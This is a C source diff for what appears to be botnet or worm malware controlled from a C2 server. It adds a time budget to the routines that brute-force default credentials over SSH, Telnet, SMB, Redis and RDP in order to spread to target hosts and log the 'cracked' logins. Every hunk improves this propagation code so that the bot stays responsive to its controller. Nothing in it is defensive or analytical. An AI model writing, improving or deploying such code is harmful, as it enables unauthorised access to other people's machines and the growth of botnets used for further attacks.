@@ -316,18 +316,63 @@ static int rdp_send_final_control(int sock);
 static int rdp_read_final_control_response(int sock);
 static int rdp_send_share_key(int sock);
 
+/* ── Per-command wall-clock budget (#191) ─────────────────── */
+/* Brute-force vectors iterate the full user x pass pool with no
+ * overall deadline. Against a slow-dropping target each attempt pays
+ * the full banner timeout, so one `spread <ip>:<port>` command can
+ * block the single-threaded command loop for many minutes and
+ * heartbeats starve (CWE-400). The C2 sets a wall-clock budget per
+ * spread command (default 60s, clamped 5000..600000); every spread_*
+ * loop checks it at the top of the user loop and aborts with -1 when
+ * exceeded, so scan_count does not increment and queued commands
+ * resume. Duration-based (not an absolute deadline): each vector
+ * captures its own start time at entry, so stale state from a previous
+ * command can never abort an unrelated later run. */
+static long g_spread_budget_ms = SPREAD_BUDGET_DEFAULT_MS;
+
+/* Set the per-command brute-force budget in milliseconds. Called from
+ * protocol.c before invoking any spread vector. Values outside
+ * SPREAD_BUDGET_MIN_MS..SPREAD_BUDGET_MAX_MS are clamped; <= 0
+ * restores the compile-time default. */
+void spread_set_budget_ms(long ms) {
+    if (ms <= 0) {
+        g_spread_budget_ms = SPREAD_BUDGET_DEFAULT_MS;
+    } else if (ms < SPREAD_BUDGET_MIN_MS) {
+        g_spread_budget_ms = SPREAD_BUDGET_MIN_MS;
+    } else if (ms > SPREAD_BUDGET_MAX_MS) {
+        g_spread_budget_ms = SPREAD_BUDGET_MAX_MS;
+    } else {
+        g_spread_budget_ms = ms;
+    }
+}
+
+/* Returns 1 when the caller's budget has run out since `start`. */
+static int spread_budget_expired(uint64_t start) {
+    return g_spread_budget_ms > 0 &&
+           (long)(get_timestamp_ms() - start) >= g_spread_budget_ms;
+}
+
 int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
     if (!bot->ssh_enabled) return -1;
-    
+
     log_info("SSH: brute-forcing %s:%d", ip, port);
-    
+
     /* Use config timeout, fall back to compile-time default */
     int timeout = SCAN_TIMEOUT_MS;
     if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;
 
+    uint64_t budget_start = get_timestamp_ms();
+    unsigned int attempts = 0;
+
     /* Try default credentials */
     for (int u = 0; default_users[u]; u++) {
+        /* #191: bound worst-case dispatch latency */
+        if (spread_budget_expired(budget_start)) {
+            log_info("spread: budget exhausted after %u attempts", attempts);
+            return -1;
+        }
         for (int p = 0; default_passes[p]; p++) {
+            attempts++;
             int sock_fd = try_login_ssh_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
             if (sock_fd >= 0) {
                 log_info("SSH: cracked %s:%d with %s:%s",
@@ -594,8 +639,17 @@ int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
     int timeout = SCAN_TIMEOUT_MS;
     if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;
 
+    uint64_t budget_start = get_timestamp_ms();
+    unsigned int attempts = 0;
+
     for (int u = 0; default_users[u]; u++) {
+        /* #191: bound worst-case dispatch latency */
+        if (spread_budget_expired(budget_start)) {
+            log_info("spread: budget exhausted after %u attempts", attempts);
+            return -1;
+        }
         for (int p = 0; default_passes[p]; p++) {
+            attempts++;
             int sock_fd = try_login_telnet_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
             if (sock_fd >= 0) {
                 log_info("Telnet: cracked %s:%d with %s:%s",
@@ -1009,8 +1063,17 @@ int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
     int timeout = SCAN_TIMEOUT_MS;
     if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;
 
+    uint64_t budget_start = get_timestamp_ms();
+    unsigned int attempts = 0;
+
     for (int u = 0; default_users[u]; u++) {
+        /* #191: bound worst-case dispatch latency */
+        if (spread_budget_expired(budget_start)) {
+            log_info("spread: budget exhausted after %u attempts", attempts);
+            return -1;
+        }
         for (int p = 0; default_passes[p]; p++) {
+            attempts++;
             int sock = try_login_smb_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
             if (sock < 0) continue;
 
@@ -1162,9 +1225,18 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
         return 0;
     }
     
+    uint64_t budget_start = get_timestamp_ms();
+    unsigned int attempts = 0;
+
     /* Try brute-force */
     for (int u = 0; default_users[u]; u++) {
+        /* #191: bound worst-case dispatch latency */
+        if (spread_budget_expired(budget_start)) {
+            log_info("spread: budget exhausted after %u attempts", attempts);
+            return -1;
+        }
         for (int p = 0; default_passes[p]; p++) {
+            attempts++;
             int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
             if (sock < 0) continue;
             
@@ -1745,8 +1817,17 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
     int timeout = SCAN_TIMEOUT_MS;
     if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;
 
+    uint64_t budget_start = get_timestamp_ms();
+    unsigned int attempts = 0;
+
     for (int u = 0; default_users[u]; u++) {
+        /* #191: bound worst-case dispatch latency */
+        if (spread_budget_expired(budget_start)) {
+            log_info("spread: budget exhausted after %u attempts", attempts);
+            return -1;
+        }
         for (int p = 0; default_passes[p]; p++) {
+            attempts++;
             int sock = try_login_rdp_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
             if (sock < 0) continue;
 
